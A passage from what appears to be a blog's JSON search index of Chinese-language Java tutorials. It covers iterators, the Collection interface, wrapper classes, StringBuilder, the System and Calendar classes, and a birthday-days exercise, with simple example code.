是JDK1.5之后出现的新特性 Collection&lt;E&gt; extends Iterable&lt;E&gt;:所有的单列集合都可以使用增强for public interface Iterable&lt;T&gt;实现这个接口允许对象成为 “foreach” 语句的目标。 增强for循环: 用来遍历集合和数组 格式: 123for(集合/数组的数据类型 变量名: 集合名/数组名)&#123;sout(变量名);&#125; 1234567891011121314151617181920212223242526272829package com.itheima.demo02.Iterator;import java.util.ArrayList;public class Demo02Foreach &#123; public static void main(String[] args) &#123; demo02(); &#125; //使用增强for循环遍历集合 private static void demo02() &#123; ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(\"aaa\"); list.add(\"bbb\"); list.add(\"ccc\"); list.add(\"ddd\"); for(String s : list)&#123; System.out.println(s); &#125; &#125; //使用增强for循环遍历数组 private static void demo01() &#123; int[] arr = &#123;1,2,3,4,5&#125;; for(int i:arr)&#123; System.out.println(i); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java迭代器的实现原理","slug":"java00155迭代器的实现原理","date":"2020-03-16T01:52:26.000Z","updated":"2020-03-16T01:53:01.867Z","comments":true,"path":"2020/03/16/java00155迭代器的实现原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00155迭代器的实现原理/","excerpt":"","text":"java迭代器的实现原理","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java迭代器的代码实现","slug":"java00154迭代器的代码实现","date":"2020-03-16T01:31:18.000Z","updated":"2020-03-16T01:33:26.732Z","comments":true,"path":"2020/03/16/java00154迭代器的代码实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00154迭代器的代码实现/","excerpt":"","text":"java迭代器的代码实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package com.itheima.demo02.Iterator;import java.util.ArrayList;import java.util.Collection;import java.util.Iterator;public class Demo01Iterator &#123; public static void main(String[] args) &#123; //创建一个集合对象 Collection&lt;String&gt; coll = new ArrayList&lt;&gt;(); //往集合中添加元素 coll.add(\"姚明\"); coll.add(\"科比\"); coll.add(\"麦迪\"); coll.add(\"詹姆斯\"); coll.add(\"艾弗森\"); /* 1.使用集合中的方法iterator()获取迭代器的实现类对象,使用Iterator接口接收(多态) 注意: Iterator&lt;E&gt;接口也是有泛型的,迭代器的泛型跟着集合走,集合是什么泛型,迭代器就是什么泛型 */ //多态 接口 实现类对象 Iterator&lt;String&gt; it = coll.iterator(); /* 发现使用迭代器取出集合中元素的代码,是一个重复的过程 所以我们可以使用循环优化 不知道集合中有多少元素,使用while循环 循环结束的条件,hasNext方法返回false */ while(it.hasNext())&#123; String e = it.next(); System.out.println(e); &#125; System.out.println(\"----------------------\"); for(Iterator&lt;String&gt; it2 = coll.iterator();it2.hasNext();)&#123; String e = it2.next(); System.out.println(e); &#125; /* //2.使用Iterator接口中的方法hasNext判断还有没有下一个元素 boolean b = it.hasNext(); System.out.println(b);//true //3.使用Iterator接口中的方法next取出集合中的下一个元素 String s = it.next(); System.out.println(s);//姚明 b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b);//没有元素,返回false s = it.next();//没有元素,在取出元素会抛出NoSuchElementException没有元素异常 System.out.println(s);*/ &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Iterator接口介绍","slug":"java00153Iterator接口介绍","date":"2020-03-16T01:25:33.000Z","updated":"2020-03-21T14:58:04.216Z","comments":true,"path":"2020/03/16/java00153Iterator接口介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00153Iterator接口介绍/","excerpt":"","text":"java Iterator接口介绍 java.util.Iterator接口: 迭代器(对集合进行遍历) 有两个常用的方法 boolean hasNext() 如果仍有元素可以迭代，则返回 true。 判断集合中还有没有下一个元素,有就返回true,没有就返回false E next() 返回迭代的下一个元素。 取出集合中的下一个元素 Iterator迭代器,是一个接口,我们无法直接使用,需要使用Iterator接口的实现类对象,获取实现类的方式比较特殊 Collection接口中有一个方法,叫iterator(),这个方法返回的就是迭代器的实现类对象 Iterator&lt;E&gt; iterator() 返回在此 collection 的元素上进行迭代的迭代器。 迭代器的使用步骤(重点): 1.使用集合中的方法iterator()获取迭代器的实现类对象,使用Iterator接口接收(多态) 2.使用Iterator接口中的方法hasNext判断还有没有下一个元素 3.使用Iterator接口中的方法next取出集合中的下一个元素","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaCollection集合常用功能","slug":"java00152Collection集合常用功能","date":"2020-03-16T01:15:46.000Z","updated":"2020-03-16T01:21:55.456Z","comments":true,"path":"2020/03/16/java00152Collection集合常用功能/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00152Collection集合常用功能/","excerpt":"","text":"java Collection集合常用功能 java.util.Collection接口 所有单列集合的最顶层的接口,里边定义了所有单列集合共性的方法 任意的单列集合都可以使用Collection接口中的方法 共性的方法: public boolean add(E e)：把给定的对象添加到当前集合中 。 public void clear() :清空集合中所有的元素。 public boolean remove(E e): 把给定的对象在当前集合中删除。 public boolean contains(E e): 判断当前集合中是否包含给定的对象。 public boolean isEmpty(): 判断当前集合是否为空。 public int size(): 返回集合中元素的个数。 public Object[] toArray(): 把集合中的元素，存储到数组中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package com.itheima.demo01.Collection;import java.util.ArrayList;import java.util.Collection;import java.util.HashSet;public class Demo01Collection &#123; public static void main(String[] args) &#123; //创建集合对象,可以使用多态 //Collection&lt;String&gt; coll = new ArrayList&lt;&gt;(); Collection&lt;String&gt; coll = new HashSet&lt;&gt;(); System.out.println(coll);//重写了toString方法 [] /* public boolean add(E e)： 把给定的对象添加到当前集合中 。 返回值是一个boolean值,一般都返回true,所以可以不用接收 */ boolean b1 = coll.add(\"张三\"); System.out.println(\"b1:\"+b1);//b1:true System.out.println(coll);//[张三] coll.add(\"李四\"); coll.add(\"李四\"); coll.add(\"赵六\"); coll.add(\"田七\"); System.out.println(coll);//[张三, 李四, 赵六, 田七] /* public boolean remove(E e): 把给定的对象在当前集合中删除。 返回值是一个boolean值,集合中存在元素,删除元素,返回true 集合中不存在元素,删除失败,返回false */ boolean b2 = coll.remove(\"赵六\"); System.out.println(\"b2:\"+b2);//b2:true boolean b3 = coll.remove(\"赵四\"); System.out.println(\"b3:\"+b3);//b3:false System.out.println(coll);//[张三, 李四, 田七] /* public boolean contains(E e): 判断当前集合中是否包含给定的对象。 包含返回true 不包含返回false */ boolean b4 = coll.contains(\"李四\"); System.out.println(\"b4:\"+b4);//b4:true boolean b5 = coll.contains(\"赵四\"); System.out.println(\"b5:\"+b5);//b5:false //public boolean isEmpty(): 判断当前集合是否为空。 集合为空返回true,集合不为空返回false boolean b6 = coll.isEmpty(); System.out.println(\"b6:\"+b6);//b6:false //public int size(): 返回集合中元素的个数。 int size = coll.size(); System.out.println(\"size:\"+size);//size:3 //public Object[] toArray(): 把集合中的元素，存储到数组中。 Object[] arr = coll.toArray(); for (int i = 0; i &lt; arr.length; i++) &#123; System.out.println(arr[i]); &#125; //public void clear() :清空集合中所有的元素。但是不删除集合,集合还存在 coll.clear(); System.out.println(coll);//[] System.out.println(coll.isEmpty());//true &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"集合框架介绍","slug":"java00151集合框架介绍","date":"2020-03-16T01:11:41.000Z","updated":"2020-03-16T01:49:00.235Z","comments":true,"path":"2020/03/16/java00151集合框架介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00151集合框架介绍/","excerpt":"","text":"集合框架介绍 JAVASE提供了满足各种需求的API，在使用这些API前，先了解其继承与接口操作架构，才能了解何时采用哪个类，以及类之间如何彼此合作，从而达到灵活应用。 集合按照其存储结构可以分为两大类，分别是单列集合java.util.Collection和双列集合java.util.Map，今天我们主要学习Collection集合，在day04时讲解Map集合。 Collection：单列集合类的根接口，用于存储一系列符合某种规则的元素，它有两个重要的子接口，分别是java.util.List和java.util.Set。其中，List的特点是元素有序、元素可重复。Set的特点是元素无序，而且不可重复。List接口的主要实现类有java.util.ArrayList和java.util.LinkedList，Set接口的主要实现类有java.util.HashSet和java.util.TreeSet。 从上面的描述可以看出JDK中提供了丰富的集合类库，为了便于初学者进行系统地学习，接下来通过一张图来描述整个集合类的继承体系。 其中，橙色框里填写的都是接口类型，而蓝色框里填写的都是具体的实现类。这几天将针对图中所列举的集合类进行逐一地讲解。 集合本身是一个工具，它存放在java.util包中。在Collection接口定义着单列集合框架中最最共性的内容。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Coolection集合概述","slug":"java00150Coolection集合概述","date":"2020-03-16T01:07:15.000Z","updated":"2020-03-21T14:57:33.786Z","comments":true,"path":"2020/03/16/java00150Coolection集合概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00150Coolection集合概述/","excerpt":"","text":"Coolection集合概述 在前面基础班我们已经学习过并使用过集合ArrayList&lt;E&gt; ,那么集合到底是什么呢? 集合：集合是java中提供的一种容器，可以用来存储多个数据。 集合和数组既然都是容器，它们有啥区别呢？ 数组的长度是固定的。集合的长度是可变的。 数组中存储的是同一类型的元素，可以存储基本数据类型值。集合存储的都是对象。而且对象的类型可以不一致。在开发中一般当对象多的时候，使用集合进行存储。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类_基本类型与字符串类型之间的相互转","slug":"java00149包装类-基本类型与字符串类型之间的相互转","date":"2020-03-15T01:26:47.000Z","updated":"2020-03-15T01:30:58.669Z","comments":true,"path":"2020/03/15/java00149包装类-基本类型与字符串类型之间的相互转/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00149包装类-基本类型与字符串类型之间的相互转/","excerpt":"","text":"java 包装类_基本类型与字符串类型之间的相互转 ​ 基本类型与字符串类型之间的相互转换 基本类型-&gt;字符串(String) ​ 1.基本类型的值+&quot;&quot; 最简单的方法(工作中常用) ​ 2.包装类的静态方法toString(参数),不是Object类的toString() 重载 ​ static String toString(int i) 返回一个表示指定整数的 String 对象。 ​ 3.String类的静态方法valueOf(参数) ​ static String valueOf(int i) 返回 int 参数的字符串表示形式。 字符串(String)-&gt;基本类型 public static byte parseByte(String s)：将字符串参数转换为对应的byte基本类型。 public static short parseShort(String s)：将字符串参数转换为对应的short基本类型。 public static int parseInt(String s)：将字符串参数转换为对应的int基本类型。 public static long parseLong(String s)：将字符串参数转换为对应的long基本类型。 public static float parseFloat(String s)：将字符串参数转换为对应的float基本类型。 public static double parseDouble(String s)：将字符串参数转换为对应的double基本类型。 public static boolean parseBoolean(String s)：将字符串参数转换为对应的boolean基本类型。 ​ 使用包装类的静态方法parseXXX(“字符串”); ​ Integer类: static int parseInt(String s) ​ Double类: static double parseDouble(String s) 1234567891011121314151617181920212223package com.itheima.demo07Integer;public class Demo03Integer &#123; public static void main(String[] args) &#123; //基本类型-&gt;字符串(String) int i1 = 100; String s1 = i1+\"\"; System.out.println(s1+200);//100200 String s2 = Integer.toString(100); System.out.println(s2+200);//100200 String s3 = String.valueOf(100); System.out.println(s3+200);//100200 //字符串(String)-&gt;基本类型 int i = Integer.parseInt(s1); System.out.println(i-10); int a = Integer.parseInt(\"a\");//NumberFormatException System.out.println(a); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类_自动装箱与自动拆箱","slug":"java00148包装类-自动装箱与自动拆箱","date":"2020-03-15T01:24:06.000Z","updated":"2020-03-15T01:25:14.727Z","comments":true,"path":"2020/03/15/java00148包装类-自动装箱与自动拆箱/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00148包装类-自动装箱与自动拆箱/","excerpt":"","text":"java包装类_自动装箱与自动拆箱 自动装箱与自动拆箱:基本类型的数据和包装类之间可以自动的相互转换 JDK1.5之后出现的新特性 1234567891011121314151617181920212223242526272829package com.itheima.demo07Integer;import java.util.ArrayList;public class Demo02Ineger &#123; public static void main(String[] args) &#123; /* 自动装箱:直接把int类型的整数赋值包装类 Integer in = 1; 就相当于 Integer in = new Integer(1); */ Integer in = 1; /* 自动拆箱:in是包装类,无法直接参与运算,可以自动转换为基本数据类型,在进行计算 in+2;就相当于 in.intVale() + 2 = 3 in = in.intVale() + 2 = 3 又是一个自动装箱 */ in = in+2; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); /* ArrayList集合无法直接存储整数,可以存储Integer包装类 */ list.add(1); //--&gt;自动装箱 list.add(new Integer(1)); int a = list.get(0); //--&gt;自动拆箱 list.get(0).intValue(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类_装箱与拆箱","slug":"java00147包装类-装箱与拆箱","date":"2020-03-15T01:15:57.000Z","updated":"2020-03-15T01:22:51.786Z","comments":true,"path":"2020/03/15/java00147包装类-装箱与拆箱/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00147包装类-装箱与拆箱/","excerpt":"","text":"java包装类_装箱与拆箱 装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) 构造方法: ​ Integer(int value) 构造一个新分配的 Integer 对象，它表示指定的 int 值。 ​ Integer(String s) 构造一个新分配的 Integer 对象，它表示 String 参数所指示的 int 值。 ​ 传递的字符串,必须是基本类型的字符串,否则会抛出异常 “100” 正确 “a” 抛异常 静态方法: ​ static Integer valueOf(int i) 返回一个表示指定的 int 值的 Integer 实例。 ​ static Integer valueOf(String s) 返回保存指定的 String 的值的 Integer 对象。 ​ 拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) 成员方法: ​ int intValue() 以 int 类型返回该 Integer 的值。 12345678910111213141516171819202122232425package com.itheima.demo07Integer;public class Demo01Integer &#123; public static void main(String[] args) &#123; //装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) //构造方法 Integer in1 = new Integer(1);//方法上有横线,说明方法过时了 System.out.println(in1);//1 重写了toString方法 Integer in2 = new Integer(\"1\"); System.out.println(in2);//1 //静态方法 Integer in3 = Integer.valueOf(1); System.out.println(in3); //Integer in4 = Integer.valueOf(\"a\");//NumberFormatException数字格式化异常 Integer in4 = Integer.valueOf(\"1\"); System.out.println(in4); //拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) int i = in1.intValue(); System.out.println(i); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类的概念","slug":"java00146包装类的概念","date":"2020-03-15T01:09:51.000Z","updated":"2020-03-15T01:14:33.524Z","comments":true,"path":"2020/03/15/java00146包装类的概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00146包装类的概念/","excerpt":"","text":"java包装类的概念 基本数据类型转包装类类型 基本类型 对应的包装类（位于java.lang包中） byte Byte short Short int Integer long Long float Float double Double char Character boolean Boolean ​ 装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) 构造方法: Integer(int value) 构造一个新分配的 Integer 对象，它表示指定的 int 值。 Integer(String s) 构造一个新分配的 Integer 对象，它表示 String 参数所指示的 int 值。 传递的字符串,必须是基本类型的字符串,否则会抛出异常 “100” 正确 “a” 抛异常 静态方法: static Integer valueOf(int i) 返回一个表示指定的 int 值的 Integer 实例。 static Integer valueOf(String s) 返回保存指定的 String 的值的 Integer 对象。 拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) 成员方法: ​ int intValue() 以 int 类型返回该 Integer 的值。 12345678910111213141516171819202122232425package com.itheima.demo07Integer;public class Demo01Integer &#123; public static void main(String[] args) &#123; //装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) //构造方法 Integer in1 = new Integer(1);//方法上有横线,说明方法过时了 System.out.println(in1);//1 重写了toString方法 Integer in2 = new Integer(\"1\"); System.out.println(in2);//1 //静态方法 Integer in3 = Integer.valueOf(1); System.out.println(in3); //Integer in4 = Integer.valueOf(\"a\");//NumberFormatException数字格式化异常 Integer in4 = Integer.valueOf(\"1\"); System.out.println(in4); //拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) int i = in1.intValue(); System.out.println(i); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java StringBuilder的toString方法","slug":"java00145StringBuilder的toString方法","date":"2020-03-15T00:33:49.000Z","updated":"2020-03-15T00:37:21.578Z","comments":true,"path":"2020/03/15/java00145StringBuilder的toString方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00145StringBuilder的toString方法/","excerpt":"","text":"java StringBuilder的toString方法 StringBuilder和String可以相互转换: String-&gt;StringBuilder:可以使用StringBuilder的构造方法 StringBuilder(String str) 构造一个字符串生成器，并初始化为指定的字符串内容。 StringBuilder-&gt;String:可以使用StringBuilder中的toString方法 public String toString()：将当前StringBuilder对象转换为String对象。 1234567891011121314151617package com.itheima.demo06StringBuilder;public class Demo03StringBuilder &#123; public static void main(String[] args) &#123; //String-&gt;StringBuilder String str = \"hello\"; System.out.println(\"str:\"+str); StringBuilder bu = new StringBuilder(str); //往StringBuilder中添加数据 bu.append(\"world\"); System.out.println(\"bu:\"+bu); //StringBuilder-&gt;String String s = bu.toString(); System.out.println(\"s:\"+s); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaStringBuilder的构造方法和append方法","slug":"java00144StringBuilder的构造方法和append方法","date":"2020-03-15T00:30:13.000Z","updated":"2020-03-15T00:32:56.966Z","comments":true,"path":"2020/03/15/java00144StringBuilder的构造方法和append方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00144StringBuilder的构造方法和append方法/","excerpt":"","text":"javaStringBuilder的构造方法和append方法 java.lang.StringBuilder类:字符串缓冲区,可以提高字符串的效率 构造方法: ​ StringBuilder() 构造一个不带任何字符的字符串生成器，其初始容量为 16 个字符。 ​ StringBuilder(String str) 构造一个字符串生成器，并初始化为指定的字符串内容。 StringBuilder的常用方法: ​ public StringBuilder append(…)：添加任意类型数据的字符串形式，并返回当前对象自身。 12345678910111213package com.itheima.demo06StringBuilder;public class Demo01StringBuilder &#123; public static void main(String[] args) &#123; //空参数构造方法 StringBuilder bu1 = new StringBuilder(); System.out.println(\"bu1:\"+bu1);//bu1:\"\" //带字符串的构造方法 StringBuilder bu2 = new StringBuilder(\"abc\"); System.out.println(\"bu2:\"+bu2);//bu2:abc &#125;&#125; 123456789101112131415161718192021222324252627282930package com.itheima.demo06StringBuilder;public class Demo02StringBuilder &#123; public static void main(String[] args) &#123; //创建StringBuilder对象 StringBuilder bu = new StringBuilder(); //使用append方法往StringBuilder中添加数据 //append方法返回的是this,调用方法的对象bu,this==bu //StringBuilder bu2 = bu.append(\"abc\");//把bu的地址赋值给了bu2 //System.out.println(bu);//\"abc\" //System.out.println(bu2);//\"abc\" //System.out.println(bu==bu2);//比较的是地址 true //使用append方法无需接收返回值// bu.append(\"abc\");// bu.append(1);// bu.append(true);// bu.append(8.8);// bu.append('中');// System.out.println(bu);//abc1true8.8中 /* 链式编程:方法返回值是一个对象,可以继续调用方法 */ System.out.println(\"abc\".toUpperCase().toLowerCase().toUpperCase().toLowerCase()); bu.append(\"abc\").append(1).append(true).append(8.8).append('中'); System.out.println(bu);//abc1true8.8中 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaStringBuilder的原理","slug":"java00143StringBuilder的原理","date":"2020-03-15T00:26:49.000Z","updated":"2020-03-15T00:29:04.265Z","comments":true,"path":"2020/03/15/java00143StringBuilder的原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00143StringBuilder的原理/","excerpt":"","text":"javaStringBuilder的原理","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaSystem类的常用方法","slug":"java00142System类的常用方法","date":"2020-03-15T00:23:25.000Z","updated":"2020-03-15T00:25:14.188Z","comments":true,"path":"2020/03/15/java00142System类的常用方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00142System类的常用方法/","excerpt":"","text":"System类的常用方法 ​ java.lang.System类中提供了大量的静态方法，可以获取与系统相关的信息或系统级操作，在System类的API文档中，常用的方法有： ​ public static long currentTimeMillis()：返回以毫秒为单位的当前时间。 ​ public static void arraycopy(Object src, int srcPos, Object dest, int destPos, int length)：将数组中指定的数据拷贝到另一个数组中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package com.itheima.demo05.System;import java.util.Arrays;public class Demo01System &#123; public static void main(String[] args) &#123; demo02(); StringBuilder sb = new StringBuilder(); &#125; /* public static void arraycopy(Object src, int srcPos, Object dest, int destPos, int length)：将数组中指定的数据拷贝到另一个数组中。 参数: src - 源数组。 srcPos - 源数组中的起始位置(起始索引)。 dest - 目标数组。 destPos - 目标数据中的起始位置。 length - 要复制的数组元素的数量。 练习: 将src数组中前3个元素，复制到dest数组的前3个位置上 复制元素前： src数组元素[1,2,3,4,5]，dest数组元素[6,7,8,9,10] 复制元素后： src数组元素[1,2,3,4,5]，dest数组元素[1,2,3,9,10] */ private static void demo02() &#123; //定义源数组 int[] src = &#123;1,2,3,4,5&#125;; //定义目标数组 int[] dest = &#123;6,7,8,9,10&#125;; System.out.println(\"复制前:\"+ Arrays.toString(dest)); //使用System类中的arraycopy把源数组的前3个元素复制到目标数组的前3个位置上 System.arraycopy(src,0,dest,0,3); System.out.println(\"复制后:\"+ Arrays.toString(dest)); &#125; /* public static long currentTimeMillis()：返回以毫秒为单位的当前时间。 用来程序的效率 验证for循环打印数字1-9999所需要使用的时间（毫秒） */ private static void demo01() &#123; //程序执行前,获取一次毫秒值 long s = System.currentTimeMillis(); //执行for循环 for (int i = 1; i &lt;=9999 ; i++) &#123; System.out.println(i); &#125; //程序执行后,获取一次毫秒值 long e = System.currentTimeMillis(); System.out.println(\"程序共耗时:\"+(e-s)+\"毫秒\");//程序共耗时:106毫秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaCalendar类的常用成员方法","slug":"java00141Calendar类的常用成员方法","date":"2020-03-15T00:19:23.000Z","updated":"2020-03-15T00:20:50.725Z","comments":true,"path":"2020/03/15/java00141Calendar类的常用成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00141Calendar类的常用成员方法/","excerpt":"","text":"java Calendar类的常用成员方法 Calendar类的常用成员方法: public int get(int field)：返回给定日历字段的值。 public void set(int field, int value)：将给定的日历字段设置为给定值。 public abstract void add(int field, int amount)：根据日历的规则，为给定的日历字段添加或减去指定的时间量。 public Date getTime()：返回一个表示此Calendar时间值（从历元到现在的毫秒偏移量）的Date对象。 成员方法的参数: int field:日历类的字段,可以使用Calendar类的静态成员变量获取 public static final int YEAR = 1; 年 public static final int MONTH = 2; 月 public static final int DATE = 5; 月中的某一天 public static final int DAY_OF_MONTH = 5;月中的某一天 public static final int HOUR = 10; 时 public static final int MINUTE = 12; 分 public static final int SECOND = 13; 秒 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102package com.itheima.demo04.Calendar;import java.util.Calendar;import java.util.Date;public class Demo02Calendar &#123; public static void main(String[] args) &#123; demo04(); &#125; /* public Date getTime()：返回一个表示此Calendar时间值（从历元到现在的毫秒偏移量）的Date对象。 把日历对象,转换为日期对象 */ private static void demo04() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); Date date = c.getTime(); System.out.println(date); &#125; /* public abstract void add(int field, int amount)：根据日历的规则，为给定的日历字段添加或减去指定的时间量。 把指定的字段增加/减少指定的值 参数: int field:传递指定的日历字段(YEAR,MONTH...) int amount:增加/减少指定的值 正数:增加 负数:减少 */ private static void demo03() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); //把年增加2年 c.add(Calendar.YEAR,2); //把月份减少3个月 c.add(Calendar.MONTH,-3); int year = c.get(Calendar.YEAR); System.out.println(year); int month = c.get(Calendar.MONTH); System.out.println(month);//西方的月份0-11 东方:1-12 //int date = c.get(Calendar.DAY_OF_MONTH); int date = c.get(Calendar.DATE); System.out.println(date); &#125; /* public void set(int field, int value)：将给定的日历字段设置为给定值。 参数: int field:传递指定的日历字段(YEAR,MONTH...) int value:给指定字段设置的值 */ private static void demo02() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); //设置年为9999 c.set(Calendar.YEAR,9999); //设置月为9月 c.set(Calendar.MONTH,9); //设置日9日 c.set(Calendar.DATE,9); //同时设置年月日,可以使用set的重载方法 c.set(8888,8,8); int year = c.get(Calendar.YEAR); System.out.println(year); int month = c.get(Calendar.MONTH); System.out.println(month);//西方的月份0-11 东方:1-12 int date = c.get(Calendar.DATE); System.out.println(date); &#125; /* public int get(int field)：返回给定日历字段的值。 参数:传递指定的日历字段(YEAR,MONTH...) 返回值:日历字段代表的具体的值 */ private static void demo01() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); int year = c.get(Calendar.YEAR); System.out.println(year); int month = c.get(Calendar.MONTH); System.out.println(month);//西方的月份0-11 东方:1-12 //int date = c.get(Calendar.DAY_OF_MONTH); int date = c.get(Calendar.DATE); System.out.println(date); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Calendar类介绍_获取对象的方式","slug":"java00140Calendar类介绍-获取对象的方式","date":"2020-03-15T00:15:16.000Z","updated":"2020-03-15T00:18:26.786Z","comments":true,"path":"2020/03/15/java00140Calendar类介绍-获取对象的方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00140Calendar类介绍-获取对象的方式/","excerpt":"","text":"Calendar类介绍_获取对象的方式 java.util.Calendar类: 日历类Calendar类是一个抽象类,里边提供了很多操作日历字段的方法(YEAR、MONTH、DAY_OF_MONTH、HOUR ) Calendar类无法直接创建对象使用,里边有一个静态方法叫getInstance(),该方法返回了Calendar类的子类对象 static Calendar getInstance() 使用默认时区和语言环境获得一个日历。 123456789101112package com.itheima.demo04.Calendar;import java.util.Calendar;public class Demo01Calendar &#123; public static void main(String[] args) &#123; Calendar c = Calendar.getInstance();//多态 System.out.println(c); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"练习_请使用日期时间相关的API，计算出一个人已经出生了多天","slug":"java00139练习-请使用日期时间相关的API，计算出一个人已经出生了多天","date":"2020-03-15T00:00:09.000Z","updated":"2020-03-15T00:01:53.785Z","comments":true,"path":"2020/03/15/java00139练习-请使用日期时间相关的API，计算出一个人已经出生了多天/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00139练习-请使用日期时间相关的API，计算出一个人已经出生了多天/","excerpt":"","text":"练习_请使用日期时间相关的API，计算出一个人已经出生了多天 12345678910111213141516171819202122232425262728293031323334353637package com.itheima.demo03.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;import java.util.Scanner;/* 练习: 请使用日期时间相关的API，计算出一个人已经出生了多少天。 分析: 1.使用Scanner类中的方法next,获取出生日期 2.使用DateFormat类中的方法parse,把字符串的出生日期,解析为Date格式的出生日期 3.把Date格式的出生日期转换为毫秒值 4.获取当前的日期,转换为毫秒值 5.使用当前日期的毫秒值-出生日期的毫秒值 6.把毫秒差值转换为天(s/1000/60/60/24) */public class Demo02Test &#123; public static void main(String[] args) throws ParseException &#123; //1.使用Scanner类中的方法next,获取出生日期 Scanner sc = new Scanner(System.in); System.out.println(\"请输入您的出生日期,格式:yyyy-MM-dd\"); String birthdayDateString = sc.next(); //2.使用DateFormat类中的方法parse,把字符串的出生日期,解析为Date格式的出生日期 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd\"); Date birthdayDate = sdf.parse(birthdayDateString); //3.把Date格式的出生日期转换为毫秒值 long birthdayDateTime = birthdayDate.getTime(); //4.获取当前的日期,转换为毫秒值 long todayTime = new Date().getTime(); //5.使用当前日期的毫秒值-出生日期的毫秒值 long time = todayTime-birthdayDateTime; //6.把毫秒差值转换为天(s/1000/60/60/24) System.out.println(time/1000/60/60/24); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java 